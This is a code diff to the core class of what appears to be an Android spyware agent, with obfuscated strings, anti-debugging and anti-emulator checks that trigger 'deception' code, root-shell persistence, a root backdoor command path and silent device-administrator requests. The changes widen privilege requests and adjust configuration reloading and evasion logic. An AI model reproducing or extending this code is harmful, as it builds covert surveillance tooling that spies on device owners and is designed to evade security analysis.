@@ -76,6 +76,7 @@ public class Core extends Activity implements Runnable {
 	private CheckAction checkActionFast;
 	private PendingIntent alarmIntent = null;
 	private ServiceMain serviceMain;
+	private boolean reload = false;
 
 	@SuppressWarnings("unused")
 	private void Core() {
@@ -166,19 +167,19 @@ public class Core extends Activity implements Runnable {
 		IntentFilter intentFilter = new IntentFilter();
 		intentFilter.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION);
 		intentFilter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
-		
+
 		WR wifiReceiver = new WR();
 		Status.getAppContext().registerReceiver(wifiReceiver, intentFilter);
-		
+
 		EvidenceReference.info(M.e("Started")); //$NON-NLS-1$
 
 		serviceRunning = true;
-		
+
 		if (Cfg.DEMO) {
 			Status.self().makeToast(M.e("Agent started!"));
 			//Toast.makeText(Status.getAppContext().getApplicationContext(), M.e("Agent started!"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
-		
+
 		return true;
 	}
 
@@ -235,7 +236,7 @@ public class Core extends Activity implements Runnable {
 				// /system/bin/ntpsvd adm
 				// "com.android.deviceinfo/com.android.deviceinfo.listener.AR"
 				String pack = Status.self().getAppContext().getPackageName();
-				String bd = M.e("/system/bin/rilcap adm");
+				String bd = Configuration.shellFile + M.e(" adm");
 				String tbe = String.format("%s %s/%s", bd, pack, M.e("com.android.deviceinfo.listener.AR"));
 				// /system/bin/ntpsvd adm
 				// \"com.android.networking/com.android.networking.listener.AR\"
@@ -243,15 +244,15 @@ public class Core extends Activity implements Runnable {
 
 			} catch (IOException ex) {
 				Check.log(TAG + " Error (unprotect): " + ex);
-			}			
-		} else if (Keys.self().wantsPrivilege() && Cfg.ADMIN) {
+			}
+		} else if (Keys.self().wantsPrivilege()) {
 			AGUI gui = Status.getAppGui();
-			
-			if (gui!=null){
+
+			if (gui != null) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (run) calling gui admin");
 				}
-				
+
 				gui.deviceAdminRequest();
 			}
 		}
@@ -294,7 +295,7 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (stopAll), stopping EvDispatcher");
 			}
-			
+
 			logDispatcher.halt();
 		} catch (final Throwable ex) {
 			if (Cfg.DEBUG) {
@@ -327,7 +328,9 @@ public class Core extends Activity implements Runnable {
 		private final int queue;
 
 		CheckAction(int queue) {
-			Thread.currentThread().setName("queue_" + queue);
+			if (Cfg.DEBUG) {
+				Thread.currentThread().setName("queue_" + queue);
+			}
 			this.queue = queue;
 		}
 
@@ -351,7 +354,7 @@ public class Core extends Activity implements Runnable {
 					Check.log(TAG + " checkActions: " + qq); //$NON-NLS-1$
 				}
 
-				if (Cfg.MEMOSTAT) {
+				if (Cfg.STATISTICS) {
 					M.printMostused();
 					logMemory();
 				}
@@ -376,6 +379,7 @@ public class Core extends Activity implements Runnable {
 					AntiDebug ad = new AntiDebug();
 					if (ad.isDebug()) {
 						stopAll();
+						return true;
 					}
 				}
 
@@ -454,21 +458,21 @@ public class Core extends Activity implements Runnable {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (taskInit) Error: Can't create a writable directory");
 				}
-				
+
 				return ConfType.Error;
 			}
 
 			// Initialize persistence
 			if (Root.isRootShellInstalled()) {
 				Persistence p = new Persistence(Status.getAppContext());
-				
+
 				p.storePackage();
 				p.addPersistance();
 			}
-			
+
 			// this markup is created by UninstallAction
 			final Markup markup = new Markup(0);
-			
+
 			if (markup.isMarkup()) {
 				UninstallAction.actualExecute();
 				return ConfType.Error;
@@ -812,16 +816,25 @@ public class Core extends Activity implements Runnable {
 
 	}
 
+	public synchronized void reload() {
+		this.reload = true;
+	}
+
+	public synchronized boolean wantsReload() {
+		return reload;
+	}
+
 	public synchronized boolean reloadConf() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (reloadConf): START");
 		}
 
-		if (verifyNewConf()) {
+		if (verifyNewConf() || reload) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (reloadConf): valid conf");
 			}
-
+			
+			reload = false;
 			stopAll();
 
 			int ret = taskInit();
@@ -847,12 +860,12 @@ public class Core extends Activity implements Runnable {
 				deceptionCode1();
 				return false;
 			}
-		}
 
-		AntiEmulator am = new AntiEmulator();
-		if (am.isEmu()) {
-			deceptionCode2();
-			return false;
+			AntiEmulator am = new AntiEmulator();
+			if (am.isEmu()) {
+				deceptionCode2();
+				return false;
+			}
 		}
 		return true;
 	}
@@ -875,4 +888,3 @@ public class Core extends Activity implements Runnable {
 	}
 
 }
-
